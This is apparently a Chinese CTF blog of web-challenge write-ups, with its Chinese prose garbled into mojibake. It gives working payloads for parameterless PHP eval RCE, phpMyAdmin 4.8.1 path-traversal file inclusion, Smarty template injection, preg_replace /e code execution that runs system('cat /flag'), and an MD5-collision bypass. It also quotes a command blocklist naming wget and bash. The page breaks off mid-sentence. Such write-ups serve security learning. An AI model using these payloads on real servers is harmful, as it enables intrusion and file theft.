<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>[(1æ¡æ¶ˆæ¯) BUU-WEB-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_24033605/article/details/116855740?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">GXYCTF2019]ç¦æ­¢å¥—å¨ƒ_TzZzEZ-webçš„åšå®¢-CSDNåšå®¢</a></p>
<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]ç¦æ­¢å¥—å¨ƒ - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>é¢˜ç›®å­˜åœ¨gitæ³„éœ²ï¼Œç”¨GitHackæ‰«ä¸€ä¸‹å¾—åˆ°æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808134953571.png" alt="image-20210808134953571"></p>
<p>å¯ä»¥çŒœåˆ°è¿™é‡Œåˆ©ç”¨äº†evalè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿</p>
<pre class="language-none"><code class="language-none">1.éœ€è¦ä»¥GETå½¢å¼ä¼ å…¥ä¸€ä¸ªåä¸ºexpçš„å‚æ•°ã€‚å¦‚æœæ»¡è¶³æ¡ä»¶ä¼šæ‰§è¡Œè¿™ä¸ªexpå‚æ•°çš„å†…å®¹ã€‚
2.è¿‡æ»¤äº†å¸¸ç”¨çš„å‡ ä¸ªä¼ªåè®®ï¼Œä¸èƒ½ä»¥ä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚
3.(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ã€‚
4.æ­£åˆ™åŒ¹é…æ‰äº†et&#x2F;na&#x2F;infoç­‰å…³é”®å­—ï¼Œå¾ˆå¤šå‡½æ•°éƒ½ç”¨ä¸äº†ã€‚
5ï¼ševal($_GET[&#39;exp&#39;]); å…¸å‹çš„æ— å‚æ•°RCE</code></pre>

<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">PHP Parametric Function RCE Â· sky&#39;s blog (skysec.top)</a>å…³äºæ— å‚æ•°rce</p>
<p>é¦–å…ˆè¦è¯»å–ç›®å½•å†…å®¹ï¼Œ</p>
<p>å¯ä»¥ç”¨print_r(scandir(&#39;.&#39;));</p>
<p>ä½†æ˜¯å› ä¸ºä¸èƒ½ä¼ å‚ï¼Œæ‰€ä»¥è¦æƒ³æŠŠ.ç”¨å‡½æ•°ä»£æ›¿</p>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨</p>
<pre class="language-none"><code class="language-none">localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯.
current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</code></pre>

<p>æ‰€ä»¥current(localeconv())æ°¸è¿œæ˜¯ä¸ª.</p>
<p>ä¹Ÿå°±å¯ä»¥ç”¨print_r(scandir(current(localeconv())));æ¥è¯»ç›®å½•</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808142444979.png" alt="image-20210808142444979"></p>
<p>å¯ä»¥çœ‹åˆ°flagå°±åœ¨flag.phpä¸­</p>
<p>ç°åœ¨è¦æƒ³åŠæ³•æŠŠå®ƒè¯»å‡ºæ¥</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨array_reverse()å’Œnextå‡½æ•°</p>
<p>é€šè¿‡array_reverse() å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚<br>ï¼ˆåè½¬ä¹‹åflag.phpè¢«æ”¾åœ¨ç¬¬äºŒä¸ªæ•°ç»„ä¹‹ä¸­ï¼‰<br>next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>payloadä¸ºï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php">ï¼Ÿexp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144017189.png" alt="image-20210808144017189"></p>
<p>ä¹Ÿå¯ä»¥åˆ©ç”¨</p>
<p>array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p>
<p>array_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</p>
<p>æœ€åå†åˆ©ç”¨readfileå‡½æ•°è¯»å‡ºæ–‡ä»¶æˆ–è€…ç”¨show_sourceè®©å®ƒé«˜äº®æ˜¾ç¤º</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144253823.png" alt="image-20210808144253823"></p>
<p>ç”±äºarray_randæ˜¯éšæœºçš„ï¼Œæ‰€ä»¥è¦å¤šåˆ·æ–°å‡ æ¬¡æ‰å¯èƒ½ä¼šæ˜¾ç¤ºflag.phpçš„å†…å®¹</p>
<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>å¾¡å‰‘æ˜¯çœŸçš„ä¸å¥½ç”¨ã€‚ã€‚ã€‚phpmyadminè·¯å¾„æ­»æ´»æ‰«ä¸å‡ºæ¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808154118587.png" alt="image-20210808154118587"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150229023.png" alt="image-20210808150229023"></p>
<p>è¿™é‡Œphpmyadminç‰ˆæœ¬æ˜¯4.8.1</p>
<p>ç”±äºphpmyadmin4.8.0-4.8.1å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>ç›´æ¥ç”¨payloadæ‰“</p>
<p>?target=db_datadict.php%253f/../../../../../../../../flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150605205.png" alt="image-20210808150605205"></p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>è¿™é“é¢˜ç¬¬ä¸€çœ¼çœ‹ä¸Šå»åƒæ˜¯æœ¬åœ°è®¿é—®çš„é¢˜ç›®</p>
<p>ä½†æ˜¯hintæœ‰æ„Ÿè§‰ä¸å¤ªåƒ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808201950916.png" alt="image-20210808201950916"></p>
<p>æŠ“åŒ…ä¿®æ”¹xffå¤´åå°±æ²¡æ€è·¯äº†ï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯smartyæ¨¡æ¿æ³¨å…¥</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202158856.png" alt="image-20210808202158856"></p>
<p>çœ‹åˆ°è¿™é‡Œæ”¯æŒé€»è¾‘è¿ç®—ï¼Œå¯ä»¥ç›´æ¥è§£æï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨ç³»ç»Ÿå‘½ä»¤æ¥è¯»flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202307003.png" alt="image-20210808202307003"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202546370.png" alt="image-20210808202546370"></p>
<p><strong>Smarty SSTIåˆ©ç”¨</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107556915">(1æ¡æ¶ˆæ¯) PHPçš„æ¨¡æ¿æ³¨å…¥ï¼ˆSmartyæ¨¡æ¿ï¼‰_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_smartyæ¨¡æ¿æ³¨å…¥</a></p>
<p>Smartyæ˜¯åŸºäºPHPå¼€å‘çš„ï¼Œå¯¹äºSmartyçš„SSTIçš„åˆ©ç”¨æ‰‹æ®µä¸å¸¸è§çš„flaskçš„SSTIæœ‰å¾ˆå¤§åŒºåˆ«ã€‚</p>
<p><strong>æ¼æ´ç¡®è®¤</strong></p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202952019.png" alt="image-20210808202952019"></p>
<p><strong>å¸¸è§„åˆ©ç”¨æ–¹å¼</strong></p>
<p>Smartyæ”¯æŒä½¿ç”¨<code>&#123;php&#125;&#123;/php&#125;</code>æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚</p>
<p><strong>{literal} æ ‡ç­¾</strong></p>
<blockquote>
<p><strong><code>&#123;literal&#125;</code>å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚</strong> è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</p>
</blockquote>
<p>è‹¥è¯¥é¢˜ç¯å¢ƒä¸ºphp5ï¼Œåˆ™å¯ä»¥</p>
<pre class="language-none"><code class="language-none">&lt;script&gt;language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</code></pre>

<p><strong>é™æ€æ–¹æ³•</strong></p>
<p>é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™è¢«ç½‘ä¸Šå¾ˆå¤šæ–‡ç« é‡‡ç”¨ã€‚</p>
<p><strong>åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤</strong></p>
<p><strong>{if}æ ‡ç­¾</strong><br>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š</p>
<p>Smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||<em>, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š{if is_array($array)}{/if}</em></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808203333956.png" alt="image-20210808203333956"></p>
<h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>ç¬¬ä¸€éƒ¨åˆ†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809002920929.png" alt="image-20210809002920929"></p>
<p>å¯ä»¥ç”¨ä¼ªåè®®è¯»å–ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç”¨hackbaræ—¶æ²¡æˆåŠŸ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225403216.png" alt="image-20210808225403216"></p>
<p>ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªpayload</p>
<pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre>

<p>base64è§£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225453870.png" alt="image-20210808225453870"></p>
<p>å½“patternä¼ å…¥çš„æ­£åˆ™è¡¨è¾¾å¼å¸¦æœ‰/eæ—¶ï¼Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå³å½“åŒ¹é…åˆ°ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å¯è¢«å½“åšä»£ç æ¥æ‰§è¡Œã€‚æ€è·¯æ˜¯åˆ©ç”¨è¿™ä¸ªä»£ç æ‰§è¡Œï¼Œæ‰§è¡Œæºç ä¸­çš„getFlag()å‡½æ•°ï¼Œåœ¨ä¼ å…¥cmdå‚æ•°ï¼Œå†åˆ©ç”¨getFlagä¸­çš„evalï¼ˆï¼‰å‡½æ•°ï¼Œå†è¿›è¡Œä¸€ä¸ªä»£ç æ‰§è¡Œã€‚</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>è¿™é‡Œç¬¬äºŒä¸ªå‚æ•°å›ºå®šä¸º<code>strtolower(&quot;\\1&quot;)</code>è¿™é‡Œçš„<code>\\1</code>å®é™…ä¸Šä½“ç°ä¸º<code>\1</code></p>
<p> <strong>\1</strong> åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰:</p>
<p><strong>åå‘å¼•ç”¨</strong><br>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®</p>
<p>è¿™é‡Œçš„\1æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</p>
<p>è¿™é‡Œæˆ‘ä»¬å°±è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥è¿è¡Œgetflagå‡½æ•°ï¼Œå¹¶åŒæ—¶ç»™cmdä¼ å‚ï¼Œåˆ©ç”¨systemæ¥æ‰§è¡Œå‘½ä»¤</p>
<p>ä¸ºäº†å®ç°è¿è¡Œgetflagçš„ç›®çš„ï¼Œå°±è¦å…ˆè®©\1ä¸ºgetflag(),ä¹Ÿå°±æ˜¯ä¼ å…¥</p>
<p> .*={${getFlag()}}</p>
<pre class="language-none"><code class="language-none">åŸå…ˆçš„è¯­å¥ï¼š preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $value);
å˜æˆäº†è¯­å¥ï¼š preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;);</code></pre>

<p>è¿™æ ·é€šè¿‡preg_replaceåå°±ä¼šè¿è¡Œgetflagå‡½æ•°ï¼Œä½†æ˜¯ç”±äºphpç‰¹æ€§.ä¼ å…¥åä¼šå˜ä¸º_æ‰€ä»¥è¿™é‡Œè¦åˆ©ç”¨æ­£åˆ™åŒ¹é…ä¸­çš„\S</p>
<p>æ‰€ä»¥ä¼ å…¥çš„payloadä¸º\S*={${getFlag()}}</p>
<pre class="language-none"><code class="language-none">\S åœ¨phpæ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºåŒ¹é…æ‰€æœ‰éç©ºå­—ç¬¦ï¼Œ*è¡¨ç¤ºå¤šæ¬¡åŒ¹é…</code></pre>

<p>æœ€ç»ˆpayloadä¸º?\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;);</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809001841771.png" alt="image-20210809001841771"></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>æ•´åäº†çŸ¥é“æ˜¯gitæ³„éœ²ä½†æ˜¯ç”¨githackæ‰«å®Œä¹‹åå°±æ˜¯æ²¡æœ‰æºç ã€‚ã€‚ã€‚</p>
<p>æ¥ä¸€ä¸‹ç™¾åº¦çš„wpçš„æºç </p>
<p>index.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
include &#39;flag.php&#39;;

$yds &#x3D; &quot;dog&quot;;
$is &#x3D; &quot;cat&quot;;
$handsome &#x3D; &#39;yds&#39;;

foreach($_POST as $x &#x3D;&gt; $y)&#123;
    $$x &#x3D; $y;
&#125;

foreach($_GET as $x &#x3D;&gt; $y)&#123;
    $$x &#x3D; $$y;
&#125;

foreach($_GET as $x &#x3D;&gt; $y)&#123;
    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;
        exit($handsome);
    &#125;
&#125;

if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;
    exit($yds);
&#125;

if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;
    exit($is);
&#125;

echo &quot;the flag is: &quot;.$flag;
</code></pre>

<p>flag.php</p>
<pre class="language-none"><code class="language-none">&lt;?php 
$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</code></pre>

<p>å‰ä¸¤ä¸ª<code>foreach</code>è¯­å¥åˆ†åˆ«å°†<code>POST</code>å‚æ•°å’Œ<code>GET</code>å‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œæ¥ç€æ˜¯ä¸‰ä¸ªifè¯­å¥ï¼Œ<code>exit()</code>å‡½æ•°é€€å‡ºè„šæœ¬çš„åŒæ—¶è¾“å‡ºå˜é‡ï¼Œæœ€åä¸€å¥æ˜¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„flagã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯è®©è„šæœ¬æ‰§è¡Œåˆ°æœ€åä¸€å¥<code>echo $flag;</code>ï¼Œä½†å³ä½¿ç»•è¿‡ä¸‰ä¸ªifè¯­å¥ï¼Œæˆ‘ä»¬<code>GET</code>ä¼ å‚æˆ–è€…<code>POST</code>ä¼ å‚çš„flagæ€»ä¼šè¢«å˜é‡è¦†ç›–ï¼šå¦‚æˆ‘ä»¬<code>GET</code>ä¼ å‚flag=aaaï¼Œåœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­å˜æˆ<code>$flag</code> = <code>$aaa</code>ï¼Œè€Œ<code>$aaa</code>å˜é‡æ²¡æœ‰å®šä¹‰ä¸ºç©ºï¼Œæœ€åçš„è¾“å‡ºå°±æ˜¯ç©º</p>
<p>ä½†æ˜¯ç”±äºå˜é‡è¦†ç›–çš„åŸå› æœ€ç»ˆä¸ä¼šæ˜¾ç¤ºflag</p>
<p>è€Œ<code>exit()</code>å‡½æ•°è™½ç„¶ä¼šé€€å‡ºæ‰§è¡Œï¼Œä½†ä¹Ÿä¼šè¾“å‡ºå…¶å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–å°†<code>exit()</code>å‡½æ•°å†…çš„å‚æ•°ç”¨<code>$flag</code>è¦†ç›–æ‰å°±èƒ½è¾“å‡ºflagäº†ï¼›</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©åä¸¤ä¸ªifè¯­å¥ä¸­çš„exitæ¥è¾“å‡ºflag</p>
<p>å½“æˆ‘ä»¬get yds=flagæ—¶ï¼Œæ»¡è¶³ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œè€Œç”±äºç¬¬ä¸€ä¸ªforeachè¯­å¥ï¼Œ$yds=$flagï¼Œæ‰€ä»¥æœ€ç»ˆå°±ä¼šå˜æˆexit($flag);</p>
<p>è¿˜å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œå½“æˆ‘ä»¬get flag=flag&amp;is=flagåç»è¿‡ç¬¬äºŒä¸ªforeachè¯­å¥$flag=$flagï¼Œ$is=$flagå¯¹flagè‡ªèº«æ— å½±å“ï¼Œåˆå› ä¸ºæ»¡è¶³ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œä¹Ÿä¼šè¾“å‡ºflagå€¼</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/113790063?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BJDCTF2020]Mark loves cat (ä¸¤ç§è§£æ³•)ï¼ˆå˜é‡è¦†ç›–æ¼æ´ï¼‰_Zero_Adamçš„åšå®¢-CSDNåšå®¢</a></p>
<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ngçš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>è¿›å…¥åçœ‹åˆ°imgå‚æ•°åƒbase64ï¼Œè§£ç ä¸¤æ¬¡å†ç”¨16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ä¼šå˜æˆ555.png</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181026268.png" alt="image-20210811181026268"></p>
<p>æ‰€ä»¥ä¸ºäº†æƒ³è¯»å–æºç ï¼Œæˆ‘ä»¬å°†index.phpæŒ‰ç…§ç›¸åŒçš„æ–¹å¼åŠ å¯†åå˜ä¸º</p>
<p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p>
<p>ä¿®æ”¹åæ›¿æ¢imgåŸæ¥çš„å€¼ï¼Œå‘ç°ä¾æ—§è¿”å›äº†ä¸€å¤§ä¸²base64ç¼–ç ï¼Œè§£ç åå¯è·å¾—æºç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181304356.png" alt="image-20210811181304356"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181317988.png" alt="image-20210811181317988"></p>
<p>é‡ç‚¹ï¼š</p>
<pre class="language-none"><code class="language-none">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;
    echo(&quot;forbid ~&quot;);
    echo &quot;&lt;br&gt;&quot;;
&#125; else &#123;
    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;
        echo &#96;$cmd&#96;;
    &#125; else &#123;
        echo (&quot;md5 is funny ~&quot;);
    &#125;
&#125;</code></pre>

<p>å…ˆçœ‹ç¬¬äºŒä¸ªifé‡Œçš„md5çš„æ¯”è¾ƒï¼Œä¼ æ•°ç»„æˆ–è€…ä¼ md5å€¼ä¸º0eå¼€å¤´çš„éƒ½æ²¡æ³•ç»•è¿‡å»</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/114494427">(1æ¡æ¶ˆæ¯) æµ…è°ˆPHPä¸­å“ˆå¸Œæ¯”è¾ƒç¼ºé™·é—®é¢˜åŠå“ˆå¸Œå¼ºæ¯”è¾ƒç›¸å…³é—®é¢˜_æœ«åˆ Â· mochu7-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c9089fd5b1ba">MD5ç¢°æ’çš„ä¸€äº›ä¾‹å­ - ç®€ä¹¦ (jianshu.com)</a></p>
<p>ä»è¿™ä¸¤ç¯‡æ–‡ç« é‡Œèƒ½æ‰¾åˆ°å­˜åœ¨æ–‡ä»¶åå…­è¿›åˆ¶å­—èŠ‚æµæ•°æ®çš„å“ˆå¸Œå€¼ç›¸ç­‰</p>
<p>å†è€ƒè™‘åˆ°è¦å°†ä¸€äº›ä¸å¯è§å­—ç¬¦ä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨urlç¼–ç </p>
<p>æœ€ç»ˆ</p>
<pre class="language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>

<p>è¿™é‡Œè¦ç»•è¿‡ä¸¤ä¸ªifè¯­å¥ï¼Œç„¶åæ‰§è¡Œcmdä¸­çš„å‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åæ–œæ ç»•è¿‡ï¼Œåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ä¸‰ä¸ªåæ–œæ æ‰èƒ½åŒ¹é…åˆ°åæ–œæ ï¼Œ</p>
